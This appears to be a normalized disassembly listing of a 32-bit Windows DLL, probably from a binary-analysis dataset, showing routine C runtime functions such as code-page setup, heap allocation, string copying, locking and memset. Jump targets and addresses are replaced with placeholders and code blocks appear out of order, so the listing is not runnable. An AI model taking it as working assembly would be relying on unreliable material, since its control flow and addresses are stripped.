cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
mov [ ecx ] ax
lea edx [ edx + 0x2 ]
lea ecx [ ecx + 0x2 ]
dec edi
jne r-xdata
push esi
call sub_10005afd
cmp ebx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp ebx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + ebx + 0x19 ] al
movzx eax [ ecx + 0x1 ]
inc ebx
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_10006eb0
mov [ esi + 0x4 ] ebx
xor ebx ebx
inc ebx
add esp 0xc
mov [ esi + 0x21c ] edi
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_10005a94
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
push [ esi + 0x4 ]
call sub_100059ee
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx ecx [ eax ]
movzx edx dl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_100060e0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10006114
push 0x8
push r--data
call sub_10004af0
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_10004b35
retn
push 0xc
call sub_1000507b
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_10005985
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000615d
sub_10006170
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ecx [ eax + 0x3c ]
add ecx eax
push esi
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
xor edx edx
add eax ecx
push edi
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100061c0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10004b50
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_10006280
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_10006170
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10006280
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_100062b1
push esi
push 0x4
push 0x20
call sub_100049c6
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_100062e0
push 0xc
push r--data
call sub_10004af0
call sub_10003e0f
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10006320
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000631a
mov eax esi
call sub_10004b35
retn
sub_10006320
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call esi
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp ebx eax
jb r-xdata
xor eax eax
mov edi ebx
sub edi eax
lea ecx [ edi + 0x4 ]
cmp ecx 0x4
jb r-xdata
push eax
call sub_10007f16
mov esi eax
lea eax [ edi + 0x4 ]
pop ecx
cmp esi eax
jae r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
lea ecx [ ebx + 0x4 ]
push ecx
mov [ ebx ] eax
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp - 0x4 ]
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push ebx
call sub_10004a59
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push ebx
call sub_10004a59
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea ebx [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_10006492
push 0x24
push r--data
call sub_10004af0
xor ebx ebx
mov [ ebp - 0x20 ] ebx
xor edi edi
mov [ ebp - 0x28 ] edi
mov esi [ ebp + 0x8 ]
cmp esi 0xb
jg r-xdata
mov eax esi
sub eax 0xf
je r-xdata
je r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_100039bc
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax esi
push 0x2
pop ecx
sub eax ecx
je r-xdata
xor eax eax
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
push esi
call sub_10006647
pop ecx
pop ecx
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax [ eax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
test ebx ebx
je r-xdata
push 0x3
call sub_10003d85
xor ebx ebx
inc ebx
mov [ ebp - 0x20 ] ebx
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_10004d21
mov [ eax ] 0x16
call sub_10005458
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x1
je r-xdata
call sub_10004b35
retn
sub eax ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x8
je r-xdata
push 0x0
call sub_1000507b
pop ecx
sub eax ecx
jne r-xdata
mov eax [ edi + 0x60 ]
mov [ ebp - 0x30 ] eax
and [ edi + 0x60 ] 0x0
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ edi + 0x64 ]
mov [ ebp - 0x34 ] eax
mov [ edi + 0x64 ] 0x8c
cmp esi 0x4
jne r-xdata
push esi
call [ ebp - 0x24 ]
push [ edi + 0x64 ]
push esi
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov edx ecx
mov [ ebp - 0x2c ] edx
cmp esi 0x8
jne r-xdata
mov eax [ ebp - 0x30 ]
mov [ edi + 0x60 ] eax
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000660d
cmp esi 0x8
jne r-xdata
mov ecx edx
imul ecx ecx 0xc
mov eax [ edi + 0x5c ]
and [ ecx + eax + 0x8 ] 0x0
inc edx
mov [ ebp - 0x2c ] edx
mov ecx [ r--data ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ edi + 0x64 ] eax
cmp esi 0x4
jne r-xdata
mov eax [ r--data ]
add eax ecx
cmp edx eax
jge r-xdata
sub_10006647
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ r--data ]
push esi
mov esi [ ebp + 0x8 ]
imul edx edx 0xc
add edx [ ebp + 0xc ]
cmp ecx edx
jae r-xdata
mov eax edx
imul eax eax 0xc
add eax [ ebp + 0xc ]
add ecx 0xc
cmp ecx eax
jb r-xdata
xor eax eax
cmp [ ecx + 0x4 ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
mov eax ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_10006690
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10006720
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_100082c5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_100082e4
jmp r-xdata
sub_10006720
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10002b9f
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10006690
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10006782
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_100067b2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100067e2
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_100049c6
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_100049c6
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ rw-data ]
jmp r-xdata
push 0x1a
pop eax
pop esi
retn
mov [ edx + eax ] ecx
add ecx 0x20
lea edx [ edx + 0x4 ]
cmp ecx rw-data
jge r-xdata
sub_1000687c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx rw-data
cmp esi ecx
jb r-xdata
lea eax [ esi + 0x20 ]
push eax
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov eax esi
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_1000507b
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_100068bb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_1000507b
mov eax [ ebp + 0xc ]
pop ecx
or [ eax + 0xc ] 0x8000
pop ebp
retn
sub_100068eb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_100051df
pop ecx
pop ebp
retn
sub_10006925
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
lea eax [ ecx + 0x10 ]
push eax
call sub_100051df
pop ecx
pop ebp
retn
sub_10006952
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10003636
movzx esi [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
mov cl [ ebp + 0x14 ]
test [ eax + esi + 0x19 ] cl
jne r-xdata
xor edx edx
inc edx
xor edx edx
cmp [ ebp + 0x10 ] edx
je r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax edx
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + esi * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
test eax eax
je r-xdata
sub_100069be
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_100031ed
pop ecx
pop ebp
retn
push ebx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100031b5
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_10003387
pop ecx
call sub_10004d21
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
inc esi
mov eax ebx
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop ebx
call sub_10004d21
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10004d34
pop ecx
mov [ esi ] eax
push esi
call sub_10003387
pop ecx
test eax eax
je r-xdata
call sub_10004d21
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10004d34
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_10006a69
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jae r-xdata
xor ecx ecx
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_10004d21
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push esi
call sub_10003387
pop ecx
test eax eax
jne r-xdata
mov eax ecx
mov [ eax ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov [ eax ] 0xc
sub_10006ae3
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_10004d21
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi edi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add esi 0x2
dec ecx
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ edi ] ax
call sub_10004d21
push 0x22
jmp r-xdata
movzx eax [ edx ]
mov [ esi + edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_10005458
mov eax esi
sub_10006b4f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10004d21
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
xor eax eax
mov [ esi ] ax
xor eax eax
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_10004d21
push 0x22
jmp r-xdata
movzx eax [ ecx ]
mov [ edi + ecx ] ax
lea ecx [ ecx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_10005458
mov eax esi
sub_10006bc4
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_10004d21
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov ebx ecx
mov edi eax
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ebx ] ax
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
movzx eax [ esi ]
mov [ ebx + esi ] ax
lea esi [ esi + 0x2 ]
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx ]
mov [ ebx ] ax
lea ebx [ ebx + 0x2 ]
test ax ax
je r-xdata
xor eax eax
mov [ ecx ] ax
call sub_10004d21
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_10005458
mov eax esi
sub_10006c82
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
js r-xdata
call sub_10004d21
mov [ eax ] 0x16
call sub_10005458
or eax 0xffffffff
pop ebp
retn
cmp eax 0x2
jle r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] eax
cmp eax 0x3
jne r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov eax ecx
pop ebp
retn
sub_10006cc2
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ EncodePointer@IAT ]
push esi
push edi
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
xor edi edi
push edi
mov [ ebp - 0x20 ] eax
call ebx
mov esi eax
mov [ ebp - 0x18 ] esi
call sub_1000471e
mov [ ebp - 0x14 ] eax
cmp [ rw-data ] edi
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
push 0x800
push edi
push r--data
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
mov eax [ rw-data ]
mov ebx [ DecodePointer@IAT ]
cmp eax esi
je r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
push 0x3
jmp r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
push eax
call [ OutputDebugStringW@IAT ]
xor eax eax
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop eax
jmp r-xdata
push 0x4
mov esi [ ebp - 0x18 ]
push r--data
push esi
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
mov esi [ ebp + 0x10 ]
push eax
call ebx
test eax eax
je r-xdata
push eax
call ebx
push [ rw-data ]
mov [ ebp - 0x14 ] eax
call ebx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002b9f
leave
retn
push esi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push edi
call eax
jmp r-xdata
call eax
mov edi eax
test edi edi
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call ecx
test eax eax
je r-xdata
push eax
call ebx
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
or esi 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ ebp - 0x18 ]
test eax eax
je r-xdata
push edi
call eax
mov edi eax
push [ rw-data ]
call ebx
test eax eax
je r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_10006eb0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
movzx eax [ esp + 0x8 ]
bt [ rw-data ] 0x1
jae r-xdata
mov edx [ esp + 0xc ]
cmp edx 0x80
jl r-xdata
mov ecx [ esp + 0xc ]
push edi
mov edi [ esp + 0x8 ]
[ edi ]
jmp r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
test eax eax
jne r-xdata
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
movd xmm0 eax
punpcklbw xmm0 xmm0
punpcklwd xmm0 xmm0
pshufd xmm0 xmm0 0x0
pxor xmm0 xmm0
jmp r-xdata
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
neg ebx
add ebx 0x10
sub edx ebx
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov ebx edx
and edx 0x7f
shr ebx 0x7
je r-xdata
push ebx
push ecx
mov ebx ecx
and ebx 0xf
test ebx ebx
jne r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec ebx
jne r-xdata
pop edx
jmp r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop eax
pop ebx
retn
mov ebx edx
shr ebx 0x4
je r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov ebx edx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec ebx
jne r-xdata
and ebx 0x3
je r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] al
inc ecx
dec ebx
jne r-xdata
sub_10006f40
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
push eax
call sub_100031b5
pop ecx
sub_1000703c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100031b5
pop ecx
push eax
call sub_100031b5
pop ecx
sub_100070a3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_100031b5
push [ esi + 0x8 ]
call sub_100031b5
push [ esi + 0xc ]
call sub_100031b5
push [ esi + 0x10 ]
call sub_100031b5
push [ esi + 0x14 ]
call sub_100031b5
push [ esi + 0x18 ]
call sub_100031b5
push [ esi ]
call sub_100031b5
push [ esi + 0x20 ]
call sub_100031b5
push [ esi + 0x24 ]
call sub_100031b5
push [ esi + 0x28 ]
call sub_100031b5
push [ esi + 0x2c ]
call sub_100031b5
push [ esi + 0x30 ]
call sub_100031b5
push [ esi + 0x34 ]
call sub_100031b5
push [ esi + 0x1c ]
call sub_100031b5
push [ esi + 0x38 ]
call sub_100031b5
push [ esi + 0x3c ]
call sub_100031b5
add esp 0x40
push [ esi + 0x40 ]
call sub_100031b5
push [ esi + 0x44 ]
call sub_100031b5
push [ esi + 0x48 ]
call sub_100031b5
push [ esi + 0x4c ]
call sub_100031b5
push [ esi + 0x50 ]
call sub_100031b5
push [ esi + 0x54 ]
call sub_100031b5
push [ esi + 0x58 ]
call sub_100031b5
push [ esi + 0x5c ]
call sub_100031b5
push [ esi + 0x60 ]
call sub_100031b5
push [ esi + 0x64 ]
